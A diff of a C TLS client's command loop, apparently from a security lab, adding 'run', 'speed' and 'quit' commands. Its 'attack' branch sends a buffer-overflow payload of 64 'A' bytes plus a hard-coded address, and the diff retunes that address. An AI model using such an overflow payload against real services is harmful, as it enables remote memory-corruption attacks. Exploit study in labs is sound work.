@@ -92,18 +92,31 @@ int main() {
             int bytes_received;
 
             while (1) {
+
+                printf("Enter command ('run' , 'stop', or 'quit'): ");
                 fgets(command,BUFFER_SIZE,stdin);
                 command[strcspn (command,"\n") ] = '\0'; 
                 int x=64; 
                 char payload[BUFFER_SIZE];
                 if (strcmp(command, "attack") == 0) {
                     memset(payload, 'A', x);
-                    memcpy(payload + x, "\x48\x15\x55\x55\x55\x00\x00\x00", 8);   
+                    memcpy(payload + x, "\x28\x15\x55\x55\x55\x00\x00\x00", 8);   
                     SSL_write(ssl, payload, sizeof(payload));
-                } else {
+                } else if (strcmp(command, "run") == 0) {
+                    SSL_write(ssl, command, strlen(command));
+                    printf("Enter speed ('high' or 'low'): ");
+                    fgets(command,BUFFER_SIZE,stdin);
+                    command[strcspn (command,"\n") ] = '\0';
                     SSL_write(ssl, command, strlen(command)); 
                 }
-            }
+                else if (strcmp(command, "quit") == 0) {
+                    return 0;
+                }
+                else {
+                   
+                    SSL_write(ssl, command, strlen(command));                  
+                
+            }}
 
             SSL_shutdown(ssl);
             SSL_free(ssl);
